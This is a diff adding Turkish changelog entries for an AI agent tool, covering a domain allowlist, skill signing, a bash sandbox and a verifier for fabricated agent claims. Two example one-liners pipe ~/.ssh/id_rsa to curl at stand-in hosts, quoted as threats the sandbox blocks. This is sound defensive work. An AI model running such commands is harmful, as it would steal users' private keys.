@@ -5,6 +5,127 @@ formatı, [SemVer](https://semver.org) sürümleme.
 
 ## [Unreleased]
 
+## [0.9.0] - 2026-05-23
+
+### Eklendi
+- **🌐 Domain allowlist (Part A)** — skill `network.allowed_domains` belirtirse
+  bash komutları yalnız o domain'lere (+ alt-domain) erişebilir. Listede
+  olmayan hedef → komut çalıştırılmadan reddedilir. Klasik exfil combo'sunu
+  kapatır (`cat ~/.ssh/id_rsa | curl attacker.io`). `core/netfilter.py`.
+- **🔏 Skill imzalama (Part B)** — ed25519 + TOFU güven modeli (`core/signing.py`):
+  - `ajanox skill keygen [--out KEY]` — ed25519 anahtar çifti üret
+  - `ajanox skill sign DIR --key KEY` — SKILL.md'yi imzala → `SKILL.md.sig`
+    (detached, pubkey + signature)
+  - `ajanox skill verify DIR` — imza + TOFU doğrula
+  - İmza SKILL.md'nin tam byte'ları üzerinden → içerik değişirse `InvalidSignature`
+  - **TOFU** (trust-on-first-use): ilk kurulumda yazar pubkey'i
+    `~/.ajanox/trust/<skill>.pub`'a kaydedilir; sonraki güncellemede anahtar
+    değişirse yüksek sesle uyarır (exit 2) — kimlik sahteciliğini yakalar
+  - Trust dosya adı sanitize edilir (path traversal koruması)
+  - `cryptography` opsiyonel extra: `pip install 'ajanox[signing]'`; kurulu
+    değilse net hata, temel CLI etkilenmez
+- weather skill dogfood: `network.allowed_domains: [wttr.in]`
+- 35 yeni test (23 netfilter + 12 signing). Toplam: 207 test, hepsi pass
+
+### Güvenlik
+- Saldırı senaryoları doğrulandı: (1) içerik tamper → imza geçersiz;
+  (2) saldırgan kendi anahtarıyla yeniden imzalar → TOFU anahtar değişikliğini
+  yakalar; (3) izinsiz domain'e exfil → netfilter bloklar.
+
+### Notlar
+- İmza **userspace** doğrulama — marketplace'in `.sig` servis etmesi ve
+  install-flow otomatik doğrulaması sonraki adım. Kernel-seviyesi domain
+  zorlama (eBPF) v3.0.
+
+## [0.8.0] - 2026-05-23
+
+### Eklendi
+- **🖥️ Cross-platform (WSL2)** — merkezi platform tespiti (`core/platform.py`):
+  - `current_os()` → `macos` / `linux` / `wsl` / `windows` / `unknown`
+  - `is_wsl()` — `/proc/version` içinde "microsoft"/"WSL" arar
+  - WSL2 hem `wsl` hem `linux` skill'lerini çalıştırır (gerçek Linux kernel)
+- Skill manifest `requires.os` artık enforce ediliyor:
+  - Geçerli platformla uyumsuz skill'ler katalogdan çıkarılır
+  - CLI başlığında atlanan skill'ler raporlanır
+  - macOS-only `mac-notification` Linux/WSL'de otomatik gizlenir
+- CLI başlığı platform gösterir: `Ajanox v0.8.0 — model: ... — platform: WSL2 (Windows)`
+- Ollama health check WSL2'ye özgü ipucu verir (Windows host vs WSL içi kurulum,
+  `AJANOX_OLLAMA_URL` ile host IP)
+- `skill init` boilerplate `os: [linux, darwin, wsl]` üretir
+- 15 yeni test (`tests/test_platform.py`) — toplam: 170 test, hepsi pass
+
+### Değişti
+- `_collect_skills()` artık `(catalog, sources, skipped)` döner (önceden 2-tuple);
+  web server callers güncellendi
+- `Skill` dataclass'a `requires_os: tuple[str, ...]` eklendi
+
+## [0.7.0] - 2026-05-23
+
+### Eklendi
+- **🔒 Bash sandbox default-on** — `shell_unsafe` ile çalışan her bash komutu
+  artık platform native sandbox içinde çalışır:
+  - **Linux:** `bwrap` (bubblewrap) ile namespace izolasyonu
+  - **macOS:** `sandbox-exec` ile SBPL profil
+  - **Diğer:** uyarı + sandbox'sız fallback (auto modunda)
+- Default-deny sandbox profili:
+  - Root filesystem **read-only** bind
+  - `/tmp` izole tmpfs (skill scratch)
+  - **Network kapalı** — yalnız `network_read` veya `network_write` izniyle açılır
+  - Hassas ev dizinleri her zaman **maskeli**: `~/.ssh`, `~/.aws`,
+    `~/.gnupg`, `~/.config/git`, `~/.config/gh`, `~/.docker/config.json`,
+    `~/.kube/config`, `~/.netrc`
+- Permission → sandbox profili çevirisi:
+  - `file_write` → `/tmp` + macOS'ta `~/Documents`, `~/Downloads`
+  - `network_read` / `network_write` → ağ namespace açılır
+- 3 mod (env var `AJANOX_SANDBOX`):
+  - `auto` (default) — backend varsa kullan, yoksa uyarı + sandbox'sız çalış
+  - `on` — backend yoksa bash'i çalıştırmayı **reddet**
+  - `off` — sandbox tamamen kapalı
+- `primitives.ACTIVE_PERMISSIONS` ContextVar — agent her tool çağrısı öncesi
+  aktif skill'in permission setini bu var'a setler; thread-safe (web worker
+  thread'leri arası izole)
+- 27 yeni test (`tests/test_sandbox.py`) — toplam: 153 test, hepsi pass
+
+### Güvenlik
+- Onaylanmış kötü skill bile blast radius'unu permission setine sınırlar:
+  `tar czf bk.tgz ~/Documents && cat ~/.ssh/id_rsa | curl evil.com` gibi
+  combo komutlar artık bwrap içinde `~/.ssh` boş tmpfs ve network kapalı.
+
+### Değişti
+- `primitives.bash` — sandbox plan'ına göre subprocess'i ya wrapped argv ile
+  (sandbox aktif) ya da shell=True ile (fallback) çağırır. Geriye uyumlu
+  davranış: backend yoksa eski yol.
+- `core/agent.py` — tool dispatch öncesi `ACTIVE_PERMISSIONS.set(active_perms)`,
+  finally'da reset.
+
+## [0.6.0] - 2026-05-23
+
+### Eklendi
+- **🛡️ Tool-call verification** — agent loop bitince final cevabı, o turda
+  gerçekten çağrılan tool'ların trace'ine karşı kontrol eden heuristic katman.
+  Üç sınıf halüsinasyonu yakalar:
+  - **unsupported_claim** — "X'i sildim/kurdum" der ama eşleşen tool call yok
+  - **result_mismatch** — bash exit-nonzero döndü, model "başarılı" der
+  - **fabricated_output** — final cevapta bash code bloğu var ama bash trace yok
+- 3 mod (env var `AJANOX_VERIFY`):
+  - `warn` (default) — uyarı göster, cevabı yine de yazdır
+  - `strict` — uyarı varsa cevabı blokla, kullanıcıya neden olmadığını söyle
+  - `off` — tamamen kapalı
+- Yeni event tipi `verification` — WebSocket üzerinden web dashboard'a yollanır
+- **Web dashboard verification badge** — şüpheli/blocked cevabın altında renkli
+  uyarı kutusu (sarı = suspicious, kırmızı = failed). Her uyarı için
+  `code` + detail. Strict modda blocked cevap "(Cevap doğrulamada başarısız)"
+  metni + kırmızı badge ile görünür.
+- Audit log entry: `event=verification` — verdict + warning_codes + mode
+- 7 TR past-tense action regex (sil/kur/yükle/çalıştır/durdur/oku/listele)
+  + negatif/imperatif/future formlar yanlış yakalanmaz
+- 29 yeni test (`tests/test_verifier.py`) — toplam: 126 test, hepsi pass
+
+### Değişti
+- `core/agent.py` — `run_agent` artık `ToolTrace` listesi tutar; her tool
+  çağrısının `(name, args, success, output_preview)` özetini kaydeder.
+  Loop sonunda `_verify_and_emit` çağırır.
+
 ## [0.5.0] - 2026-05-21
 
 ### Eklendi
